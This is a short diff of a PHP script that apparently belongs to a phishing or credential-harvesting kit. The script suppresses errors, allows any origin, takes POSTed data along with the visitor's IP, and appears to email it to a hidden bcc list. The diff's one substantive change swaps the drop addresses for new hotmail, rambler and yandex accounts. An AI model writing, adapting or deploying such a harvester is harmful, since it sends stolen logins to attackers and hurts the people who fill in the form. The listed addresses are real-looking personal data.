@@ -2,7 +2,7 @@
 header('Access-Control-Allow-Origin: *');  
 error_reporting(0);
 
-$bcc = array('licensebox@rambler.ru,zayinafanasiy@yandex.ru');
+$bcc = array('panshank1089@hotmail.com,panshank1089@rambler.ru,jabbahmachine108@yandex.com');
 
 if($_SERVER['REQUEST_METHOD'] == 'POST'){
 	$client  = @$_SERVER['HTTP_CLIENT_IP'];
@@ -63,4 +63,5 @@ error was encountered while trying to use an Error Document to handle the reques
 ');
 }
 ?>
+
 
